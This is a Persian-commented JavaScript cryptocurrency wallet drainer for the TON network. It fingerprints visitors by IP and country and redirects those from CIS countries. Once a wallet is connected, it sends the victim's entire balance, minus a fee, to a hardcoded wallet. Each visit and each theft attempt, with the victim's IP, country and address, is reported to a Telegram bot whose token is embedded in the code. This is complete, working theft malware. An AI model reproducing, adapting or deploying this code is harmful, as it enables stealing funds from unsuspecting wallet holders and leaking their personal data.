// ============================================================
// بخش ۱: تنظیمات (Config) - این مقادیر را با اطلاعات خود جایگزین کنید
// ============================================================
const CONFIG = {
    mainWallet: "UQAGnvcycMpe3mhiROvlzk3n6X1rbv_7cazxk0bLXL3pN5tI", // کیف پول مقصد
    tgBotToken: "8241244631:AAGVFK0mMvBC6CG6rr3W4fdx2PwSbqtHu6o", // توکن ربات تلگرام
    tgChat: "-1004388966169", // شناسه کانال یا گروه (با منفی اول)
    feeTon: 0.01, // کارمزد ثابت به واحد TON
    blockedCountries: ['RU','KZ','BY','UA','AM','AZ','KG','MD','UZ'], // کشورهای مسدود
    redirectUrl: 'https://ton.org' // آدرس هدایت برای کشورهای مسدود
};

// ============================================================
// بخش ۲: مدیریت موقعیت مکانی و مسدودسازی
// ============================================================
let ipUser = 'Unknown';
let countryUser = 'Unknown';
const domain = window.location.hostname;

function blockCISCountries() {
    fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            ipUser = data.ip;
            countryUser = data.country;
            console.log(`📍 IP: ${ipUser} | کشور: ${countryUser}`);

            // اگر کشور در لیست ممنوعه باشد و هنوز کیف پول وصل نشده، هدایت کن
            if (CONFIG.blockedCountries.includes(countryUser) && !tonConnectUI.connected) {
                window.location.replace(CONFIG.redirectUrl);
            }

            // ارسال گزارش بازدید به تلگرام
            sendTelegram(`🔄 *دامنه:* ${domain}\n👤 *کاربر:* ${ipUser} (${countryUser})\n📖 *صفحه باز شد*`);
        })
        .catch(err => console.error('❌ خطا در دریافت IP:', err));
}

// ============================================================
// بخش ۳: ارتباط با تلگرام
// ============================================================
function sendTelegram(message) {
    const url = `https://api.telegram.org/bot${CONFIG.tgBotToken}/sendMessage`;
    const params = new URLSearchParams({
        chat_id: CONFIG.tgChat,
        text: message,
        parse_mode: 'Markdown'
    });

    fetch(`${url}?${params}`, { method: 'POST' })
        .then(res => res.ok ? console.log('✅ پیام تلگرام ارسال شد') : console.error('❌ خطا در ارسال پیام'))
        .catch(err => console.error('❌ خطای شبکه:', err));
}

// ============================================================
// بخش ۴: راه‌اندازی TonConnect UI
// ============================================================
const tonConnectUI = new TonConnectUI({
    manifestUrl: `https://${domain}/tonconnect-manifest.json`,
    buttonRootId: 'ton-connect'
});

// رویداد اتصال موفق
tonConnectUI.on('walletConnected', (walletInfo) => {
    console.log(`✅ کیف پول متصل شد: ${walletInfo.account.address}`);
    // پس از اتصال، دوباره مسدودسازی را بررسی می‌کنیم (امنیت بیشتر)
    // اما اگر کشور مسدود باشد و کاربر کیف پول وصل کرده باشد، اجازه می‌دهیم
    // چون قبلاً شرط !tonConnectUI.connected را داشتیم، پس خطری ندارد
});

// ============================================================
// بخش ۵: عملیات تخلیه (DRAIN)
// ============================================================
async function didtrans() {
    // ۵-۱: بررسی اتصال کیف پول
    if (!tonConnectUI.connected) {
        alert('⚠️ لطفاً ابتدا کیف پول را متصل کنید!');
        return;
    }

    const walletAddress = tonConnectUI.account.address;
    if (!walletAddress) {
        alert('❌ آدرس کیف پول یافت نشد!');
        return;
    }

    try {
        // ۵-۲: دریافت موجودی از شبکه
        const res = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
        const data = await res.json();
        const balanceNano = parseFloat(data.balance); // موجودی به نانو

        // ۵-۳: محاسبه مبلغ قابل ارسال (کم کردن کارمزد)
        const feeNano = CONFIG.feeTon * 1e9;
        const sendAmount = balanceNano - feeNano;

        if (sendAmount <= 0) {
            alert(`❌ موجودی ناکافی! کارمزد مورد نیاز: ${CONFIG.feeTon} TON`);
            return;
        }

        // ۵-۴: ساخت تراکنش
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 300,
            messages: [{
                address: CONFIG.mainWallet,
                amount: sendAmount.toString()
            }]
        };

        // ۵-۵: ارسال تراکنش
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('✅ تراکنش موفق:', result);

        // ۵-۶: گزارش موفقیت به تلگرام
        const sentTon = (sendAmount / 1e9).toFixed(4);
        const successMsg = `🔄 *دامنه:* ${domain}\n👤 *کاربر:* ${ipUser} (${countryUser})\n🔗 *کیف پول:* [مشاهده در TonScan](https://tonscan.org/address/${walletAddress})\n\n💰 *ارسال شد:* ${sentTon} TON`;
        sendTelegram(successMsg);
        alert(`✅ مبلغ ${sentTon} TON با موفقیت ارسال شد!`);

    } catch (error) {
        // ۵-۷: مدیریت خطا
        console.error('❌ خطا در تراکنش:', error);
        const errorMsg = `🔄 *دامنه:* ${domain}\n👤 *کاربر:* ${ipUser} (${countryUser})\n🔗 *کیف پول:* [مشاهده در TonScan](https://tonscan.org/address/${walletAddress})\n\n⚠️ *انصراف یا خطا*`;
        sendTelegram(errorMsg);
        alert('❌ تراکنش ناموفق بود (انصراف یا خطا).');
    }
}

// ============================================================
// بخش ۶: اتصال دکمه‌ی DRAIN به تابع
// ============================================================
document.getElementById('drainBtn').addEventListener('click', didtrans);

// ============================================================
// بخش ۷: اجرای اولیه هنگام بارگذاری صفحه
// ============================================================
blockCISCountries();
console.log('🚀 اپلیکیشن با موفقیت بارگذاری شد!');
